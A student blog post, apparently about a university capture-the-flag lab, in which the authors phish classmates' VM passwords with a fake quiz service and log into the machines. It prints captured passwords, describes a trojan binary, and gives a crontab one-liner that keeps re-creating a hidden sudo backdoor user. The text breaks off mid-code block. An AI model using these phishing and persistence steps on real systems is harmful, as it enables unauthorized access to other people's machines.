<html><head><title>Blog | Phishing cybersecurity students</title><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"><meta name="robots" content="index,follow"><meta name="theme-color" content="#212121"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><link href="https://fonts.googleapis.com/css?family=Hind:400,700&amp;display=swap" rel="stylesheet"><link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:300,400&amp;display=swap" rel="stylesheet"><link href="https://fonts.googleapis.com/icon?family=Material+Icons|Material+Icons+Outlined" rel="stylesheet"><style>
      body, input, button {
        font-family: 'Hind', sans-serif;
      }

      code, .hljs {
        font-family: 'Source Code Pro', 'Courier New', Courier, monospace;
      }

      .icon-font {
        font-family: 'Material Icons';
        font-weight: normal;
        font-style: normal;
        font-size: 24px;  /* Preferred icon size */
        display: inline-block;
        line-height: 1;
        text-transform: none;
        letter-spacing: normal;
        word-wrap: normal;
        white-space: nowrap;
        direction: ltr;
      
        /* Support for all WebKit browsers. */
        -webkit-font-smoothing: antialiased;
        /* Support for Safari and Chrome. */
        text-rendering: optimizeLegibility;
      
        /* Support for Firefox. */
        -moz-osx-font-smoothing: grayscale;
      
        /* Support for IE. */
        font-feature-settings: 'liga';
      }

      .icon-font.outline {
        font-family: 'Material Icons Outlined';
      }
    </style><link href="/styles/codedoc-styles.css" rel="stylesheet"><script async="" defer="" src="/./codedoc-bundle.js"></script></head><body><div class="header-0-0-2"><script async="" defer="" src="https://buttons.github.io/buttons.js"></script><a class="github-button" data-color-scheme="no-preference: light; light: light; dark: dark;" data-icon="octicon-star" data-show-count="false" data-size="large" href="https://github.com/LukasForst/blog/">Star</a><br><br></div><div id="-codedoc-container" class="container"><h1 id="phishing-cybersecurity-students" class="heading-0-0-1"><span class="icon-font">link</span><span>Phishing cybersecurity students</span></h1><hr><p><span><em>Authors: <a href="https://www.linkedin.com/in/martinrepa">Martin Řepa</a>, <a href="https://forst.pw">Lukáš Forst</a></em></span></p><p><span>Phishing has been recently the most efficient attack. It exploits human naivity and none vigilance - attack vector which is actually very hard to defend. </span></p><p><span>Altough the phising attacks are mostly targeted on the common internet users, because it is much harder to trick advanced users, in the following text, we describe how we managed to phish passwords of cyber-security students.</span></p><h2 id="background" class="heading-0-0-1"><span class="icon-font">link</span><span>Background</span></h2><p><span>During practices within cyber-security related subject we were split into two-man teams to play the Capture The Flag challenge and practise techniques we learnt. Each team owned one virtual machine in a virtual network. Everything was allowed - except the (D)DOS attacks.</span></p><h2 id="first-assignment" class="heading-0-0-1"><span class="icon-font">link</span><span>First Assignment</span></h2><p><span>Our first task was to use <a href="https://nmap.org/">nmap</a> to discover secret services on secret machines within our virtual network and, lastly, find the token. Many jokes and baits were set up to confuse our search. One service, for example, offered the following URL - <a href="https://bit.ly/take-your-token">https://bit.ly/take-your-token</a>. Another one returned following ASCI art.</span></p><pre class="with-bar"><code class="undefined code-0-0-8" tabindex="0"><span class="wmbar-0-0-11"><span></span><span></span><span></span><span></span></span><div class="line-0-0-10 " data-content="<HEADER>"><span class="lineCounter-0-0-9 prim">1</span><header></header></div><br><div class="line-0-0-10 " data-content="<TITLE>Nope!</TITLE>"><span class="lineCounter-0-0-9">2</span><title>Nope!</title></div><br><div class="line-0-0-10 " data-content="<P>"><span class="lineCounter-0-0-9">3</span><p></p></div><br><div class="line-0-0-10 " data-content=" -----------------------------------------------------"><span class="lineCounter-0-0-9">4</span> -----------------------------------------------------</div><br><div class="line-0-0-10 " data-content=" This is not the port you are looking for. Try harder!"><span class="lineCounter-0-0-9 prim">5</span> This is not the port you are looking for. Try harder!</div><br><div class="line-0-0-10 " data-content=" ----------------------------------------------------- "><span class="lineCounter-0-0-9">6</span> ----------------------------------------------------- </div><br><div class="line-0-0-10 " data-content="        \   ^__^"><span class="lineCounter-0-0-9">7</span>        \   ^__^</div><br><div class="line-0-0-10 " data-content="         \  (oo)\_______"><span class="lineCounter-0-0-9">8</span>         \  (oo)\_______</div><br><div class="line-0-0-10 " data-content="            (__)\       )\/\"><span class="lineCounter-0-0-9">9</span>            (__)\       )\/\</div><br><div class="line-0-0-10 " data-content="                ||----w |"><span class="lineCounter-0-0-9 prim">10</span>                ||----w |</div><br><div class="line-0-0-10 " data-content="                ||     ||"><span class="lineCounter-0-0-9">11</span>                ||     ||</div><br><div class="line-0-0-10 " data-content=""><span class="lineCounter-0-0-9">12</span></div><br><div class="line-0-0-10 " data-content="https://linuxgazette.net/issue67/orr.html"><span class="lineCounter-0-0-9">13</span>https://linuxgazette.net/issue67/orr.html</div><br><div class="line-0-0-10 " data-content="</P>"><span class="lineCounter-0-0-9">14</span><p></p></div><br><div class="line-0-0-10 " data-content="</BODY>"><span class="lineCounter-0-0-9 prim">15</span></div><br></code></pre><h3 id="lets-have-some-fun" class="heading-0-0-1"><span class="icon-font">link</span><span>Let's have some fun</span></h3><p><span>After we found our token, we got an idea to make our service to confuse our school mates. Firstly, we launched a simple python HTTP server, which was just replying following text:</span></p><pre class=""><code class="bash code-0-0-8" tabindex="0"><span class="wmbar-0-0-11"><span></span><span></span><span></span><span></span></span><div class="line-0-0-10 " data-content="> The ip 192.168.1.150 might be useful :P"><span class="lineCounter-0-0-9 prim">1</span><span class="token operator">&gt;</span> The <span class="token function">ip</span> <span class="token number">192.168</span>.1.150 might be useful :P</div><br></code></pre><p><span>Of course, this IP was not useful at all. Yeah, now, to me, it seems unnecessarily mean as well. Nonetheless, we thought we could do much more. </span></p><p><span>As we knew the username to our machine (duh), which was <code>class</code>, we worked with the precondition that all VMs have the same user. To gain access, we needed "just" a password, which was generated by the teachers, and in our case, it started with color - i.e. <code>blue9834</code> or <code>green7562</code>.</span></p><h3 id="just-ask-for-the-password" class="heading-0-0-1"><span class="icon-font">link</span><span>Just ask for the password</span></h3><p><span>We created simple TCP service running on port 80, asking for passwords multiple times, then terminating the connection and printing passwords to the simple log. By asking for passwords, we mean asking for passwords - nothing sophisticated.</span></p><pre class=""><code class="undefined code-0-0-8" tabindex="0"><span class="wmbar-0-0-11"><span></span><span></span><span></span><span></span></span><div class="line-0-0-10 " data-content="> Please insert password to your VM to proof you're a human:"><span class="lineCounter-0-0-9 prim">1</span>&gt; Please insert password to your VM to proof you're a human:</div><br></code></pre><p><span>We thought nobody would take the bait, and the story ends for us. The end.</span></p><h4 id="even-experts-can-be-fooled" class="heading-0-0-1"><span class="icon-font">link</span><span>Even experts can be fooled</span></h4><p><span>Well, we couldn't be more wrong. As all the students were trying to the get the token and scanning the network, our service was discovered really quickly, and we noticed that the logs are full of strings produced by the <code>nmap</code> </span></p><pre class="with-bar"><code class="undefined code-0-0-8" tabindex="0"><span class="wmbar-0-0-11"><span></span><span></span><span></span><span></span></span><div class="line-0-0-10 " data-content="// nmap scan example"><span class="lineCounter-0-0-9 prim">1</span>// nmap scan example</div><br><div class="line-0-0-10 " data-content="Iteration 1 response:Connection with: &quot;('192.168.1.230', 49488)&quot;:"><span class="lineCounter-0-0-9">2</span>Iteration 1 response:Connection with: "('192.168.1.230', 49488)":</div><br><div class="line-0-0-10 " data-content="I will ask them 7 times for a password"><span class="lineCounter-0-0-9">3</span>I will ask them 7 times for a password</div><br><div class="line-0-0-10 " data-content="Iteration 0 response:GET / HTTP/1.0"><span class="lineCounter-0-0-9 prim">4</span>Iteration 0 response:GET / HTTP/1.0</div><br></code></pre><p><span>or by random inputs from the users.</span></p><pre class="with-bar"><code class="undefined code-0-0-8" tabindex="0"><span class="wmbar-0-0-11"><span></span><span></span><span></span><span></span></span><div class="line-0-0-10 " data-content="// user input example"><span class="lineCounter-0-0-9 prim">1</span>// user input example</div><br><div class="line-0-0-10 " data-content="Connection with: &quot;('192.168.1.230', 49558)&quot;:"><span class="lineCounter-0-0-9">2</span>Connection with: "('192.168.1.230', 49558)":</div><br><div class="line-0-0-10 " data-content="I will ask them 8 times for a password"><span class="lineCounter-0-0-9">3</span>I will ask them 8 times for a password</div><br><div class="line-0-0-10 " data-content="Iteration 0 response:htrhthrt"><span class="lineCounter-0-0-9">4</span>Iteration 0 response:htrhthrt</div><br><div class="line-0-0-10 " data-content="Iteration 1 response:hrthrthrth"><span class="lineCounter-0-0-9 prim">5</span>Iteration 1 response:hrthrthrth</div><br><div class="line-0-0-10 " data-content="Iteration 2 response:rthhrthrth"><span class="lineCounter-0-0-9 prim">6</span>Iteration 2 response:rthhrthrth</div><br></code></pre><p><span>After a while, we noticed that some user inputs start with the color (<code>blue</code>, <code>green</code>) and match the same pattern as our password does. </span></p><pre class="with-bar"><code class="undefined code-0-0-8" tabindex="0"><span class="wmbar-0-0-11"><span></span><span></span><span></span><span></span></span><div class="line-0-0-10 " data-content="// user input example with password"><span class="lineCounter-0-0-9 prim">1</span>// user input example with password</div><br><div class="line-0-0-10 " data-content="Connection with: &quot;('192.168.1.230', 49554)&quot;:"><span class="lineCounter-0-0-9">2</span>Connection with: "('192.168.1.230', 49554)":</div><br><div class="line-0-0-10 " data-content="I will ask them 2 times for a password"><span class="lineCounter-0-0-9">3</span>I will ask them 2 times for a password</div><br><div class="line-0-0-10 " data-content="Iteration 0 response:green234"><span class="lineCounter-0-0-9 prim">4</span>Iteration 0 response:green234</div><br></code></pre><p><span>We tried to log in to the victim's VM using default <code>class</code> user and the <code>&lt;color&gt;&lt;number&gt;</code> password we found in the log and.... voila we are in.</span></p><pre class="with-bar"><code class="bash code-0-0-8" tabindex="0"><span class="wmbar-0-0-11"><span></span><span></span><span></span><span></span></span><div class="line-0-0-10 " data-content="> ssh class@192.168.1.230"><span class="lineCounter-0-0-9 prim">1</span><span class="token operator">&gt;</span> <span class="token function">ssh</span> class@192.168.1.230</div><br><div class="line-0-0-10 " data-content="// password green234"><span class="lineCounter-0-0-9">2</span>// password green234</div><br><div class="line-0-0-10 " data-content="> class@ubuntu16:~$ "><span class="lineCounter-0-0-9 prim">3</span><span class="token operator">&gt;</span> class@ubuntu16:~$ </div><br></code></pre><p><span>Of course, we were surprised how easy it was. What was even more surprising was the fact that we did steal multiple passwords, so not just one user, but three of them gave us their passwords. And of course, we did steal all their flags (unfortunately, we did not get additional points for them).</span></p><p><span>To be honest, we did not expect stealing any password. It was just for fun. However, this motivated us to go further.</span></p><h3 id="lets-fake-real-service" class="heading-0-0-1"><span class="icon-font">link</span><span>Let's fake real service</span></h3><p><span>We knew that just the straightforward asking for the password looks way to suspicious, so we tried to behave like some real service, that was programmed by a teacher to verify the knowledge of the students.</span></p><p><span>To do that, we created a set of questions that were randomly asked by the server. Full set is on our <a href="https://github.com/LukasForst/BSY/blob/master/hacks/passworder/questions.json">Github</a>.</span></p><pre class="with-bar"><code class="json code-0-0-8" tabindex="0"><span class="wmbar-0-0-11"><span></span><span></span><span></span><span></span></span><div class="line-0-0-10 " data-content="{"><span class="lineCounter-0-0-9 prim">1</span><span class="token punctuation">{</span></div><br><div class="line-0-0-10 " data-content="    &quot;question&quot;: &quot;What is an ecrypted form of http?&quot;,"><span class="lineCounter-0-0-9">2</span>    <span class="token property">"question"</span><span class="token operator">:</span> <span class="token string">"What is an ecrypted form of http?"</span><span class="token punctuation">,</span></div><br><div class="line-0-0-10 " data-content="    &quot;correct&quot;: &quot;https&quot;"><span class="lineCounter-0-0-9">3</span>    <span class="token property">"correct"</span><span class="token operator">:</span> <span class="token string">"https"</span></div><br><div class="line-0-0-10 " data-content="}"><span class="lineCounter-0-0-9 prim">4</span><span class="token punctuation">}</span></div><br></code></pre><p><span>The server picked up a few random questions and asked victim if they know the correct answer. If their answer was correct, then the server asked for the password to verify the identity of the victim.</span></p><pre class="with-bar"><code class="undefined code-0-0-8" tabindex="0"><span class="wmbar-0-0-11"><span></span><span></span><span></span><span></span></span><div class="line-0-0-10 " data-content="> What is an ecrypted form of http?"><span class="lineCounter-0-0-9 prim">1</span>&gt; What is an ecrypted form of http?</div><br><div class="line-0-0-10 " data-content="https"><span class="lineCounter-0-0-9">2</span>https</div><br><div class="line-0-0-10 " data-content="> The default port for SSH is?"><span class="lineCounter-0-0-9">3</span>&gt; The default port for SSH is?</div><br><div class="line-0-0-10 " data-content="22"><span class="lineCounter-0-0-9">4</span>22</div><br><div class="line-0-0-10 " data-content="> Well you got everything correct."><span class="lineCounter-0-0-9 prim">5</span>&gt; Well you got everything correct.</div><br><div class="line-0-0-10 " data-content="> Now confirm me you're not a robot (or nmap)"><span class="lineCounter-0-0-9">6</span>&gt; Now confirm me you're not a robot (or nmap)</div><br><div class="line-0-0-10 " data-content="> Send me password to your class user in your VM."><span class="lineCounter-0-0-9">7</span>&gt; Send me password to your class user in your VM.</div><br><div class="line-0-0-10 " data-content="not-a-password"><span class="lineCounter-0-0-9 prim">8</span>not-a-password</div><br></code></pre><p><span>We also logged the answers.</span></p><pre class="with-bar"><code class="json code-0-0-8" tabindex="0"><span class="wmbar-0-0-11"><span></span><span></span><span></span><span></span></span><div class="line-0-0-10 " data-content="{"><span class="lineCounter-0-0-9 prim">1</span><span class="token punctuation">{</span></div><br><div class="line-0-0-10 " data-content="  &quot;timestamp&quot;: &quot;2019-10-24 19:31:41.993228&quot;,"><span class="lineCounter-0-0-9">2</span>  <span class="token property">"timestamp"</span><span class="token operator">:</span> <span class="token string">"2019-10-24 19:31:41.993228"</span><span class="token punctuation">,</span></div><br><div class="line-0-0-10 " data-content="  &quot;ip&quot;: &quot;192.168.1.173&quot;,"><span class="lineCounter-0-0-9">3</span>  <span class="token property">"ip"</span><span class="token operator">:</span> <span class="token string">"192.168.1.173"</span><span class="token punctuation">,</span></div><br><div class="line-0-0-10 " data-content="  &quot;password&quot;: &quot;not-a-password&quot;"><span class="lineCounter-0-0-9">4</span>  <span class="token property">"password"</span><span class="token operator">:</span> <span class="token string">"not-a-password"</span></div><br><div class="line-0-0-10 " data-content="  &quot;all_answers&quot;: ["><span class="lineCounter-0-0-9 prim">5</span>  <span class="token property">"all_answers"</span><span class="token operator">:</span> <span class="token punctuation">[</span></div><br><div class="line-0-0-10 " data-content="    &quot;https&quot;,"><span class="lineCounter-0-0-9">6</span>    <span class="token string">"https"</span><span class="token punctuation">,</span></div><br><div class="line-0-0-10 " data-content="    &quot;22&quot;,"><span class="lineCounter-0-0-9">7</span>    <span class="token string">"22"</span><span class="token punctuation">,</span></div><br><div class="line-0-0-10 " data-content="    &quot;yes&quot;"><span class="lineCounter-0-0-9">8</span>    <span class="token string">"yes"</span></div><br><div class="line-0-0-10 " data-content="  ],"><span class="lineCounter-0-0-9">9</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span></div><br><div class="line-0-0-10 " data-content="  &quot;correct_answers&quot;: 3"><span class="lineCounter-0-0-9 prim">10</span>  <span class="token property">"correct_answers"</span><span class="token operator">:</span> <span class="token number">3</span></div><br><div class="line-0-0-10 " data-content="}"><span class="lineCounter-0-0-9 prim">11</span><span class="token punctuation">}</span></div><br></code></pre><p><span>All in all, we started to look like a real service used for the first assignment in the cyber-sec class. Again, we didn't think that we would get any passwords. In spite of class full of pretty smart students, few of them fell for the trap, and we gained access to 2 additional VMs.</span></p><h3 id="automating-the-password-verification" class="heading-0-0-1"><span class="icon-font">link</span><span>Automating the password verification</span></h3><p><span>As the log file grew, we were not ablfacte to check all the provided passwords, so we had to automate the password checking. We used the very same service to check the provided password by trying to connect via SSH to the victim's VM with the default <code>class</code> username. </span></p><pre class="with-bar"><code class="json code-0-0-8" tabindex="0"><span class="wmbar-0-0-11"><span></span><span></span><span></span><span></span></span><div class="line-0-0-10 " data-content="{"><span class="lineCounter-0-0-9 prim">1</span><span class="token punctuation">{</span></div><br><div class="line-0-0-10 " data-content="  ...,"><span class="lineCounter-0-0-9">2</span>  ...<span class="token punctuation">,</span></div><br><div class="line-0-0-10 " data-content="  &quot;ip&quot;: &quot;192.168.1.173&quot;,"><span class="lineCounter-0-0-9">3</span>  <span class="token property">"ip"</span><span class="token operator">:</span> <span class="token string">"192.168.1.173"</span><span class="token punctuation">,</span></div><br><div class="line-0-0-10 " data-content="  &quot;found_password&quot;: false,"><span class="lineCounter-0-0-9">4</span>  <span class="token property">"found_password"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span></div><br><div class="line-0-0-10 " data-content="  ..."><span class="lineCounter-0-0-9 prim">5</span>  ...</div><br><div class="line-0-0-10 " data-content="}"><span class="lineCounter-0-0-9 prim">6</span><span class="token punctuation">}</span></div><br></code></pre><p><span>Then we could occasionally check the log just for the records with the found passwords. We used a nice tool called <a href="https://stedolan.github.io/jq/">JQ</a> for the bash JSON processing and visualization.</span></p><pre class=""><code class="bash code-0-0-8" tabindex="0"><span class="wmbar-0-0-11"><span></span><span></span><span></span><span></span></span><div class="line-0-0-10 " data-content="> cat phisingLog.json | jq 'select(.correct_password != null)' | jq"><span class="lineCounter-0-0-9 prim">1</span><span class="token operator">&gt;</span> <span class="token function">cat</span> phisingLog.json <span class="token operator">|</span> jq <span class="token string">'select(.correct_password != null)'</span> <span class="token operator">|</span> jq</div><br></code></pre><p><span>and of course, after a while, somebody got caught.</span></p><pre class="with-bar"><code class="json code-0-0-8" tabindex="0"><span class="wmbar-0-0-11"><span></span><span></span><span></span><span></span></span><div class="line-0-0-10 " data-content="{"><span class="lineCounter-0-0-9 prim">1</span><span class="token punctuation">{</span></div><br><div class="line-0-0-10 " data-content="  ..."><span class="lineCounter-0-0-9">2</span>  ...</div><br><div class="line-0-0-10 " data-content="  &quot;ip&quot;: &quot;192.168.1.115&quot;,"><span class="lineCounter-0-0-9">3</span>  <span class="token property">"ip"</span><span class="token operator">:</span> <span class="token string">"192.168.1.115"</span><span class="token punctuation">,</span></div><br><div class="line-0-0-10 " data-content="  &quot;correct_password&quot;: true,"><span class="lineCounter-0-0-9">4</span>  <span class="token property">"correct_password"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span></div><br><div class="line-0-0-10 " data-content="  &quot;password&quot;: &quot;red23434&quot;,"><span class="lineCounter-0-0-9 prim">5</span>  <span class="token property">"password"</span><span class="token operator">:</span> <span class="token string">"red23434"</span><span class="token punctuation">,</span></div><br><div class="line-0-0-10 " data-content="  ..."><span class="lineCounter-0-0-9">6</span>  ...</div><br><div class="line-0-0-10 " data-content="}"><span class="lineCounter-0-0-9">7</span><span class="token punctuation">}</span></div><br><div class="line-0-0-10 " data-content=""><span class="lineCounter-0-0-9 prim">8</span></div><br></code></pre><p><span>And again, the default password provided by the teacher... Come on, people, change your password when you get it from somebody else.</span></p><h3 id="realizing-the-mistake" class="heading-0-0-1"><span class="icon-font">link</span><span>Realizing the mistake</span></h3><p><span>As the server was checking the passwords automatically, we would pick them up, steal the victim's flags and browse their machine for "interesting things". However, we found one record in the log file, where the server found the correct password (and not the default one, which was itself interesting), and we were not able to connect to this particular VM with SSH to steal the flags.</span></p><pre class="with-bar"><code class="json code-0-0-8" tabindex="0"><span class="wmbar-0-0-11"><span></span><span></span><span></span><span></span></span><div class="line-0-0-10 " data-content="{"><span class="lineCounter-0-0-9 prim">1</span><span class="token punctuation">{</span></div><br><div class="line-0-0-10 " data-content="  ..."><span class="lineCounter-0-0-9">2</span>  ...</div><br><div class="line-0-0-10 " data-content="  &quot;ip&quot;: &quot;192.168.1.240&quot;,"><span class="lineCounter-0-0-9">3</span>  <span class="token property">"ip"</span><span class="token operator">:</span> <span class="token string">"192.168.1.240"</span><span class="token punctuation">,</span></div><br><div class="line-0-0-10 " data-content="  &quot;correct_password&quot;: true,"><span class="lineCounter-0-0-9">4</span>  <span class="token property">"correct_password"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span></div><br><div class="line-0-0-10 " data-content="  &quot;password&quot;: &quot;*bXnc4Vd&quot;,"><span class="lineCounter-0-0-9 prim">5</span>  <span class="token property">"password"</span><span class="token operator">:</span> <span class="token string">"*bXnc4Vd"</span><span class="token punctuation">,</span></div><br><div class="line-0-0-10 " data-content="  ..."><span class="lineCounter-0-0-9">6</span>  ...</div><br><div class="line-0-0-10 " data-content="}"><span class="lineCounter-0-0-9 prim">7</span><span class="token punctuation">}</span></div><br></code></pre><p><span>We don't know for sure what happened, but we suppose that the user gave us his/her password, then realized his/her mistake and must have change it.</span></p><p><span>This led us to the next improvements.</span></p><h3 id="faster-than-the-victim" class="heading-0-0-1"><span class="icon-font">link</span><span>Faster than the victim</span></h3><p><span>We realized that we need to create a backdoor to the victim's system, to be able to access the VM even after the user changed the password. As we did not have any experience with creating backdoors, we just tried to create a new Linux user called <code>default</code>. This was done automatically when the server successfully verified the password it got from the victim.</span></p><h3 id="spreading-the-infection" class="heading-0-0-1"><span class="icon-font">link</span><span>Spreading the infection</span></h3><p><span>We already had passwords and backdoors from the 5 victims, and we started to think about the moving of our server into the victim's VMs, to lower the risk of exposure. Also, we wanted to be able to deploy the server to any computer without installing additional dependencies, so we had to compile our python server into native code using <a href="https://www.pyinstaller.org/">PyInstaller</a>. To compile the code and deploy it to VM was a bit tricky as our local machines had different environments, and the VMs had a completely different environment. After trial and error, we were able (to some extent) to replicate the VMs environment in the specific Docker python image - like really specific, for some reason - the one that worked was:</span></p><pre class=""><code class="undefined code-0-0-8" tabindex="0"><span class="wmbar-0-0-11"><span></span><span></span><span></span><span></span></span><div class="line-0-0-10 " data-content="python@sha256:b53bb1ecef1995577aacacaef0a9ce681e3267e2166646eb4788b9d5eff54735"><span class="lineCounter-0-0-9 prim">1</span>python@sha256:b53bb1ecef1995577aacacaef0a9ce681e3267e2166646eb4788b9d5eff54735</div><br></code></pre><p><span>The <a href="https://github.com/LukasForst/BSY/blob/adece37ec96231843cc5fcae99aa4c71adb4d1fa/hacks/passworder/Makefile">Makefile</a> and the used <a href="https://github.com/LukasForst/BSY/blob/adece37ec96231843cc5fcae99aa4c71adb4d1fa/hacks/passworder/build.sh">build script</a> can be found in the <a href="https://github.com/LukasForst/BSY/">Git repo</a>.</span></p><p><span>As we managed to compile the server, we were facing another challenge - to get the found passwords from the victim VM to our VM without possibly exposing the found passwords.
Our solution to this problem was... a bit more complicated than it could be. Still, we were lazy and tried not to modify the application itself, so we rather bent the environment the server was running in. We basically used the <a href="https://en.wikipedia.org/wiki/Cron">Cron</a> and <a href="https://www.openssl.org/">OpenSSL</a> to encrypt, transfer and decrypt the logs.</span></p><p><span>The server (on a victim's machine) was producing logs in the plaintext. On the victim's machine, we set up a <a href="https://github.com/LukasForst/BSY/blob/4fe069dd9e9d39533c15a645627e23148ac8be05/hacks/victim_our.sh#L6">cron job</a>, which periodically used OpenSSL to encrypt the logs and to clear the plaintext one. Then the <a href="https://github.com/LukasForst/BSY/tree/master/hacks/encryption">script</a> running on our VM just picked up the encrypted logs and copied them via SSH to our machine, where the logs were decrypted. </span></p><h3 id="defending-the-access" class="heading-0-0-1"><span class="icon-font">link</span><span>Defending the access</span></h3><p><span>Unfortunately, as our password database grew, we were discovered by the teachers.</span></p><pre class="with-bar"><code class="undefined code-0-0-8" tabindex="0"><span class="wmbar-0-0-11"><span></span><span></span><span></span><span></span></span><div class="line-0-0-10 " data-content="Hi list!"><span class="lineCounter-0-0-9 prim">1</span>Hi list!</div><br><div class="line-0-0-10 " data-content=""><span class="lineCounter-0-0-9">2</span></div><br><div class="line-0-0-10 " data-content="While you do the second assignment, be careful of some fake ports out there!"><span class="lineCounter-0-0-9">3</span>While you do the second assignment, be careful of some fake ports out there!</div><br><div class="line-0-0-10 " data-content="Never give your password to anyone!"><span class="lineCounter-0-0-9">4</span>Never give your password to anyone!</div><br><div class="line-0-0-10 " data-content=""><span class="lineCounter-0-0-9 prim">5</span></div><br><div class="line-0-0-10 " data-content="The real assignment do not asks for any password."><span class="lineCounter-0-0-9">6</span>The real assignment do not asks for any password.</div><br><div class="line-0-0-10 " data-content=""><span class="lineCounter-0-0-9">7</span></div><br><div class="line-0-0-10 " data-content="Those machines are full of hackers!!"><span class="lineCounter-0-0-9">8</span>Those machines are full of hackers!!</div><br><div class="line-0-0-10 " data-content=""><span class="lineCounter-0-0-9">9</span></div><br><div class="line-0-0-10 " data-content="Sebas"><span class="lineCounter-0-0-9 prim">10</span>Sebas</div><br></code></pre><p><span><em>The funny thing is that even after this e-mail warning sent to the whole class, we got new password match and therefore new VM to our collection</em></span></p><p><span>We had to ensure that the machines we were operating, stays under our control. As we had the access via a new user <code>default</code>, we decided to use (again, not very bright solution, but it gets the work done) the <a href="https://github.com/LukasForst/BSY/blob/c14a40c13504a4fd46d12524f82ed218122c82f9/hacks/victim_our.sh#L8">cron</a> with this magnificent command.</span></p><pre class=""><code class="bash code-0-0-8" tabindex="0"><span class="wmbar-0-0-11"><span></span><span></span><span></span><span></span></span><div class="line-0-0-10 " data-content="(crontab -l 2>/dev/null; echo &quot;*/20 * * * * if [ \$(grep -c '^default:' /etc/passwd) -eq 0 ]; then useradd -m -p p0j1kHlO8H0mE -s /bin/bash default &amp;&amp; usermod -aG sudo default; fi&quot;) | crontab -"><span class="lineCounter-0-0-9 prim">1</span><span class="token punctuation">(</span>crontab -l <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null<span class="token punctuation">;</span> <span class="token builtin class-name">echo</span> <span class="token string">"*/20 * * * * if [ \<span class="token variable"><span class="token variable">$(</span><span class="token function">grep</span> -c <span class="token string">'^default:'</span> /etc/passwd<span class="token variable">)</span></span> -eq 0 ]; then useradd -m -p p0j1kHlO8H0mE -s /bin/bash default &amp;&amp; usermod -aG sudo default; fi"</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">crontab</span> -</div><br></code></pre><p><span>What it does is that it checks every 20 minutes that the user with name <code>default</code> does exist, and if not, it creates it with our hashed password.</span></p><h3 id="summary" class="heading-0-0-1"><span class="icon-font">link</span><span>Summary</span></h3><p><span>By using relatively simple and naive social engineering and phishing techniques, we were able to gain access to 9 virtual machines. The total headcount is then following:</span></p><table><thead><th><span></span></th><th style="text-align: center"><span>Count</span></th></thead><tbody><tr><td><span>Number of students VMs in the network</span></td><td style="text-align: center"><span>29</span></td></tr><tr><td><span>Unique IPs connecting to our service</span></td><td style="text-align: center"><span>12</span></td></tr><tr><td><span>Number of students that gave us password</span></td><td style="text-align: center"><span>9</span></td></tr><tr><td><span>Number of actually hacked machines</span></td><td style="text-align: center"><span>7</span></td></tr><tr><td><span>Number of VMs with gained access at the end of the course</span></td><td style="text-align: center"><span>3</span></td></tr></tbody></table><p><span>Apart from the fact that the people that should know how to behave on the internet gave us their passwords to the VMs, we were astonished by the easiness of it. The first version (code here on <a href="https://github.com/LukasForst/BSY/blob/master/hacks/passworder/v1/get_permissions.py">Github</a>) of the server just asked for the password, nothing less, nothing more.</span></p><p><span>Regarding the code, unfortunately, we were developing in a hurry on multiple machines as well as on the VM, and for that reason, some code is probably lost. The remainings can be found on the <a href="https://github.com/LukasForst/BSY/tree/master/hacks">Github</a>.</span></p><h2 id="second-assignment" class="heading-0-0-1"><span class="icon-font">link</span><span>Second assignment</span></h2><p><span>The second assignment was targeted to utilize <a href="https://www.tcpdump.org/manpages/tcpdump.1.html">tcpdump</a> and analyze network traffic which we were supposed to capture via our virtual machine. The sequence of desired events occurred periodically every 2 hours.</span></p><h3 id="the-plan" class="heading-0-0-1"><span class="icon-font">link</span><span>The plan</span></h3><p><span>Right after the assignment was published, we got an idea for our next stunt. We planned to spam the local network with traffic, which would stealthily hint our schoolmates to explore our machine. Then we would write simple Golang application, which would try to create a new user on a running machine, which we'd offer for downloading via HTTP server. We assumed somebody would find our traffic, scan our machine, find the HTTP server, download the Golang binary, run it and voilá - we would have access. A simple diagram below describes the plan.</span></p><p><span><img src="https://i.imgur.com/PNb7p2V.png" alt=""></span></p><p><span>To be honest, we were a little sceptical about this plan, because our program would have to ask for root privileges in order to create our backdoor user. Well, let's see what happened. </span></p><h3 id="implementation" class="heading-0-0-1"><span class="icon-font">link</span><span>Implementation</span></h3><p><span>We knew we had only two hours to prepare everything if we wanted to get our traffic into every pcap file our schoolmates would capture.</span></p><p><span>Firstly, we needed all IP addresses of machines of our schoolmates to spam the network with our traffic. That one was easy - we simply took IP address of every host on the network which had ssh port opened. </span></p><p><span>Secondly, we had to figure out how to spam the network so the packets would appear in a pcap file (the targeted machines had only TCP port 22 opened). After a while of playing, we found out that UDP packet - sent even to closed port - appears in the captured pcap. That was brilliant; we would just spam random UDP ports with our subliminal message. </span></p><p><span>We implemented the UDP spammer as a python3.7 <a href="https://github.com/LukasForst/BSY/blob/master/hacks/ncat_spammer/ncat_spammer.py">script</a>, and an example packet can be seen below:</span></p><pre class="with-bar"><code class="undefined code-0-0-8" tabindex="0"><span class="wmbar-0-0-11"><span></span><span></span><span></span><span></span></span><div class="line-0-0-10 " data-content="23:57:28.251061 IP 192.168.1.150.60526 > 192.168.1.132.52272: UDP, length 68"><span class="lineCounter-0-0-9 prim">1</span>23:57:28.251061 IP 192.168.1.150.60526 &gt; 192.168.1.132.52272: UDP, length 68</div><br><div class="line-0-0-10 " data-content="E..`..@.@............n.0.L._FROM PORT 80 SERVING /files/ff/1a219642941c4e9d82992318446e7a9e.txt"><span class="lineCounter-0-0-9 prim">2</span>E..`..@.@............n.0.L._FROM PORT 80 SERVING /files/ff/1a219642941c4e9d82992318446e7a9e.txt</div><br></code></pre><p><span>Lastly, we implemented our <a href="https://github.com/LukasForst/BSY/tree/master/hacks/go-exploit">Golang application</a> which would create the backdoor user for us. Also, to be entirely sure about what's going on, the program would be sending us logs back to our machine via HTTP POST requests about the progress. </span></p><h3 id="results" class="heading-0-0-1"><span class="icon-font">link</span><span>Results</span></h3><p><span>The following day, we encountered some logs waiting for us:</span></p><pre class="with-bar"><code class="json code-0-0-8" tabindex="0"><span class="wmbar-0-0-11"><span></span><span></span><span></span><span></span></span><div class="line-0-0-10 " data-content="{"><span class="lineCounter-0-0-9 